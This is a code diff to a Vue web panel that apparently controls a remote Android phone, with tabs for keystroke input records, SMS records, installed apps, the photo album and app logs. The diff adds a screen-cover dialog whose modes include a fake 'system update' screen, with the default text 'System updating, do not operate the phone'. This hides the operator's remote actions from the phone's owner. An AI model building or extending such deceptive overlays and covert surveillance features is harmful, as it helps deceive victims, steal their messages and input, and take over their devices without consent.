@@ -202,11 +202,57 @@
 
 
               <div class="side-control-item">
-                <el-button :type="config.screenOff ? 'danger' : 'success'" @click="screenOff" size="small">
+                <el-button :type="config.screenOff ? 'danger' : 'success'" @click="()=>{
+                  if(config.screenOff){
+                    screenOff();
+                  }else{
+                    screenOffDialogVisible = true;
+                  }
+                }" size="small">
                   <el-icon>
                     <Monitor />
                   </el-icon>{{ config.screenOff ? "退出遮挡" : "遮挡屏幕" }}
                 </el-button>
+
+                <el-dialog title="遮挡屏幕选项" v-model="screenOffDialogVisible" width="400px" :modal="false" :append-to-body="false"
+                :teleport="false" :lock-scroll="false" modal-class="input-dialog-modal" class="input-dialog">
+                <el-form>
+                  <el-form-item label="模式">
+                    <el-select v-model="config.screenOffType" placeholder="模式" filterable style="width: 100%">
+                    <el-option label="纯黑" :value="0" />
+                    <el-option label="简单文案" :value="1" />
+                    <el-option label="系统更新" :value="2" />
+                  </el-select>
+
+                  </el-form-item>
+
+                  <el-form-item v-if="config.screenOffType == 1"  label="文案">
+                     
+                    <el-input v-model="config.screenOffTips" placeholder="文案"/>
+                    <!-- <el-select v-model="config.screenOffTips" placeholder="文案" filterable style="width: 100%">
+                      <el-option label="正在更新系统,请勿操作手机" value="正在更新系统,请勿操作手机" />
+                      <el-option label="简单文案" value="1" />
+                      <el-option label="系统更新" value="2" />
+                    </el-select> -->
+                  </el-form-item>
+                </el-form>
+                 
+
+
+
+                  <template #footer>
+                    <div class="dialog-footer">
+                      <el-button @click="screenOffDialogVisible = false">取消</el-button>
+                      <el-button type="primary"
+                        @click="()=>{
+                          screenOffDialogVisible = false;
+                          screenOff();
+                        }">确定</el-button>
+                    </div>
+                  </template>
+                </el-dialog>
+
+                
               </div>
 
               <div class="side-control-item">
@@ -341,6 +387,11 @@
       <!-- 右侧工具区：用 Tabs 承载 输入记录/安装应用/短信记录/查看相册 -->
       <div class="tools-panel">
         <el-tabs v-model="toolsTab" type="border-card" class="tools-tabs">
+          <el-tab-pane label="App日志" name="logs">
+            <div class="tools-tab-body">
+              <LogsList :device-id="deviceId" />
+            </div>
+          </el-tab-pane>
           <el-tab-pane label="输入记录" name="input">
             <div class="tools-tab-body">
               <div class="log-header">
@@ -402,11 +453,7 @@
             </div>
           </el-tab-pane>
 
-          <el-tab-pane label="App日志" name="logs">
-            <div class="tools-tab-body">
-              <LogsList :device-id="deviceId" />
-            </div>
-          </el-tab-pane>
+          
         </el-tabs>
       </div>
     </div>
@@ -554,7 +601,7 @@ export default defineComponent({
     longpress
   },
   setup() {
-    const toolsTab = ref("input");
+    const toolsTab = ref("logs");
     const route = useRoute();
     const isPageMode = computed(() => String(route.query.page || "") === "1");
     const pageKey = computed(() => String(route.query.key || ""));
@@ -567,6 +614,7 @@ export default defineComponent({
     const unlocking = ref(false);
     const cameraVisible = ref(false);
     const linesVisible = ref(false);
+    const screenOffDialogVisible = ref(false);
     const scrollDialogVisible = ref(false);
     const inputDialogVisible = ref(false);
     const inputTextRef = ref<any>(null);
@@ -596,10 +644,11 @@ export default defineComponent({
       lines: false,
       screenQuality: 10,
       screenOff: false,
-      screenOffTips: '',
+      screenOffTips: '正在更新系统,请勿操作手机',
       preventOperate: false,
       camera: false,
-      cameraScreenQuality: 10
+      cameraScreenQuality: 10,
+      screenOffType: 0
     });
 
 
@@ -1708,8 +1757,12 @@ export default defineComponent({
       }
       addLog("info", `已发送指令:screen_req`, "click");
     };
+
+
+
     const screenOff = () => {
       config.value.screenOff = !config.value.screenOff;
+      console.log(config.value);
       if (isConnected.value) {
         (device.value as any).status = config.value.screenOff ? 0 : 1;
         const screenOffMsg = encodeWsMessage(MessageType.config, config.value)
@@ -2015,7 +2068,8 @@ export default defineComponent({
       cameraRotation,
       linesVisible,
       openLines,
-      closeLines
+      closeLines,
+      screenOffDialogVisible
     };
   }
 });
